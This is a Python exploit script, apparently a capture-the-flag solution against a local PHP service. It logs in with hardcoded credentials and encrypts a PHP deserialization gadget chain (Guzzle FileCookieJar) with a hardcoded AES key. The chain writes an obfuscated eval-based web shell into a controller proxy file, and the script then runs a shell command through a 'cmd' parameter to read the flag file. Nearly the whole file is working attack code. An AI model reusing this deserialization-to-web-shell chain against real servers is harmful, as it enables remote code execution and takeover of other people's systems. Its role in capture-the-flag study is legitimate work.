import base64
import json
import os
import hashlib
import hmac
import passwd_crack

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


BASE_URL = "http://localhost:9501"

def load_key(base64_key: str) -> bytes:
    return base64.b64decode(base64_key)


def aes_encrypt(data, key: bytes):

    plaintext = data
    iv = os.urandom(16)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    iv_b64 = base64.b64encode(iv).decode()
    ct_b64 = base64.b64encode(ciphertext).decode()

    mac_hex = hmac.new(
        key,
        (iv_b64 + ct_b64).encode(),
        hashlib.sha256
    ).hexdigest()

    payload = json.dumps({
        "iv": iv_b64,
        "value": ct_b64,
        "mac": mac_hex
    })

    return base64.b64encode(payload.encode()).decode()


def encrypt_payload(data, base64_key):
    key = load_key(base64_key)
    return aes_encrypt(data, key)


if __name__ == "__main__":
    AES_KEY_BASE64 = "Yle1msnwyuUb8+JZDai6Ww=="
    data = base64.b64decode('TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjExNjA6Ijw/cGhwIGV2YWwoYmFzZTY0X2RlY29kZSgnWkdWamJHRnlaU0FvYzNSeWFXTjBYM1I1Y0dWelBURXBPd292S2lvS0lDb2dWR2hwY3lCbWFXeGxJR2x6SUhCaGNuUWdiMllnU0hsd1pYSm1MZ29nS2dvZ0tpQkFiR2x1YXlBZ0lDQWdhSFIwY0hNNkx5OTNkM2N1YUhsd1pYSm1MbWx2Q2lBcUlFQmtiMk4xYldWdWRDQm9kSFJ3Y3pvdkwyaDVjR1Z5Wmk1M2FXdHBDaUFxSUVCamIyNTBZV04wSUNCbmNtOTFjRUJvZVhCbGNtWXVhVzhLSUNvZ1FHeHBZMlZ1YzJVZ0lHaDBkSEJ6T2k4dloybDBhSFZpTG1OdmJTOW9lWEJsY21ZdmFIbHdaWEptTDJKc2IySXZiV0Z6ZEdWeUwweEpRMFZPVTBVS0lDb3ZDbTVoYldWemNHRmpaU0JCY0hCY1EyOXVkSEp2Ykd4bGNqc0tDblZ6WlNCQmNIQmNRMjl0Ylc5dVhGSmxjM0J2Ym5ObE93cDFjMlVnWm5WdVkzUnBiMjRnU0hsd1pYSm1YRk4xY0hCdmNuUmNaVzUyT3dwamJHRnpjeUJTVDBsVFVIVmliR2xqUTI5dWRISnZiR3hsY2lCbGVIUmxibVJ6SUVGaWMzUnlZV04wUTI5dWRISnZiR3hsY2dwN0NpQWdJQ0IxYzJVZ1hFaDVjR1Z5Wmx4RWFWeEJiM0JjVUhKdmVIbFVjbUZwZERzS0lDQWdJSFZ6WlNCY1NIbHdaWEptWEVScFhFRnZjRnhRY205d1pYSjBlVWhoYm1Sc1pYSlVjbUZwZERzS0lDQWdJR1oxYm1OMGFXOXVJRjlmWTI5dWMzUnlkV04wS0NrS0lDQWdJSHNLSUNBZ0lDQWdJQ0JwWmlBb2JXVjBhRzlrWDJWNGFYTjBjeWh3WVhKbGJuUTZPbU5zWVhOekxDQW5YMTlqYjI1emRISjFZM1FuS1NrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0J3WVhKbGJuUTZPbDlmWTI5dWMzUnlkV04wS0M0dUxtWjFibU5mWjJWMFgyRnlaM01vS1NrN0NpQWdJQ0FnSUNBZ2ZRb2dJQ0FnSUNBZ0lDUjBhR2x6TFQ1ZlgyaGhibVJzWlZCeWIzQmxjblI1U0dGdVpHeGxjaWhmWDBOTVFWTlRYMThwT3dvZ0lDQWdmUW9nSUNBZ2NIVmliR2xqSUdaMWJtTjBhVzl1SUdGbGMxOXJaWGtvS1FvZ0lDQWdld29nSUNBZ0lDQWdJQ1JyWlhrZ1BTQWtkR2hwY3kwK2NtVnhkV1Z6ZEMwK2FXNXdkWFFvSjJOdFpDY3NKM2RvYjJGdGFTY3BPd29nSUNBZ0lDQWdJSEpsZEhWeWJpQWtkR2hwY3kwK2NtVnpjRzl1YzJVdFBtcHpiMjRvVW1WemNHOXVjMlU2T21wemIyNWZiMnNvV3lKeVpYTWlJRDArSUhONWMzUmxiU2drYTJWNUtWMHBLVHNLSUNBZ0lIMEtmUT09JykpOz8+Ijt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6Njk6InJ1bnRpbWUvY29udGFpbmVyL3Byb3h5L0FwcF9Db250cm9sbGVyX1JPSVNQdWJsaWNDb250cm9sbGVyLnByb3h5LnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO30=')

    login_data = passwd_crack.encrypt_payload("admin", "123321", AES_KEY_BASE64)
    r0 = requests.post(url=BASE_URL + '/api/login', data={'data': login_data},cookies={"ROIS_SESSION_ID":"aznub2Hwl37pFSjQ7HMfdcncrYB81WHccDf5O4xh"})

    encrypted = encrypt_payload(data, AES_KEY_BASE64)
    # print(encrypted)
    r1 = requests.post(url=BASE_URL+'/api/debug',data={'option':'aes_decrypt','data':encrypted},cookies={"ROIS_SESSION_ID":"aznub2Hwl37pFSjQ7HMfdcncrYB81WHccDf5O4xh"})
    # print(r.text)
    r2 = requests.get(url=BASE_URL+ '/api/get_aes_key', params={'cmd':"cat /rctf_2025_flag"})
    print(r2.text)
